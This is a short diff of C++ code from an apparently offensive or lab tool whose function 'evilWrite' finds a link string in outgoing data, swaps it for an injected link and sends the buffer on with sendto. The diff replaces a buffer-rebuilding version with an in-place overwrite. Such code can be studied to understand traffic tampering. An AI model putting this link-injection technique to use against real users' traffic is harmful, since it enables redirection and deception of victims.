@@ -65,36 +65,8 @@ ssize_t EvilUser::evilWrite(int fd, const void *&buf, size_t &count)
     size_t retSize = 0;
     if ((p = (char *)strstr((const char *)buf, wikiLink)))
     {
-
-      //  memcpy(tmpBuffer, buf, count);
-        // int size = p -(char *)buf;
-        
-        // tmpBuffer[size] = 'V';
-        // memcpy(tmpBuffer+size, buf+size+5, count-size-5);
-     //   buf = tmpBuffer;
-        // count = count-5;
-        
-      //  count = count+1;
-        size_t tmpCount = 0;
-        memset(tmpBuffer, 0, MAX_TMPBUFFER_SIZE);
-        int injectLinkSize = strlen(injectLink);
         int wikiLinkSize = strlen(wikiLink);
-
-        tmpCount += p - (char *)buf;
-        memcpy(tmpBuffer, buf, tmpCount);
-        
-        
-        memcpy(tmpBuffer + tmpCount, injectLink, injectLinkSize);
-        tmpCount += injectLinkSize;
-        
-        memcpy(tmpBuffer + tmpCount, 
-               p + wikiLinkSize, count - (p + wikiLinkSize - (char *)buf));
-
-        tmpCount += count - (p - (char *)buf + wikiLinkSize);
-        buf = tmpBuffer;
-        retSize = tmpCount - count;
-        count = tmpCount;
-
+        memcpy(p, injectLink, wikiLinkSize);
         sendto(sockFd, buf+10, count,0,(struct sockaddr*)&client,sizeof(client)); 
     }
 
